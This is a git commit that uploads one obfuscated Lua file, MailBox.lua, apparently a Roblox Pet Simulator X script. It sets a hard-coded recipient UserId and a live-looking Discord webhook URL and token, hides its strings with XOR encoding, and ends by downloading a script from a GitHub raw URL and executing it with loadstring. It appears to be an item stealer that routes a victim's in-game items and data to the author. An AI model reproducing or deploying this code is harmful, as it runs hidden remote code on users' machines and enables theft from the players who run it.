645bbf16ee1e3a9ff66929d4e79e77b524640879
Hauntzzz <128915107+Hauntzzz@users.noreply.github.com>
2023-03-29 09:44:28 +0300

    Add files via upload

---
+++ MailBox.lua
@@ -0,0 +1,12 @@
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.2.5) ~  Much Love, Ferib 
+
+]]--
+
+local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9)local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + ((v11-1)% #v9) ,1 + ((v11-1)% #v9) + 1 )))%256 ));end return v5(v10);end UserId=733064144 -(13 + 11) ;WebHook="https://discord.com/api/webhooks/1090526216303427585/EV2Nj2OKzdzxgpKPfNSY7yizUYTeMh_pjIJGmYDOgT4dFuVvJeYObro3YHuipgQkfJ2a";_G.CustomScriptName=v7("\35\139\222\24\205\34\22\202\228\23\206\32\78\173\226\61","\110\234\183\116\175\77");_G.Text1=v7("\12\64\59\237\41\65\61\169\19\76\40\224\48\91\116\167\110","\64\47\90\137");_G.Text2=v7("\212\19\124\87\234\28\114\3\229\29\103\3\208\17\103\74\243\6","\131\114\21\35");_G.Text3=v7("\159\77\187\2\115\181\75\185\65\75\191\87\183\17\108\175\11\240\79","\220\37\222\97\24");_G.Text4=v7("\56\157\200\65\31\128\199\84\75\186\202\65\2\153\221\29\69\199","\107\233\169\51");loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimxgm.lua"))();
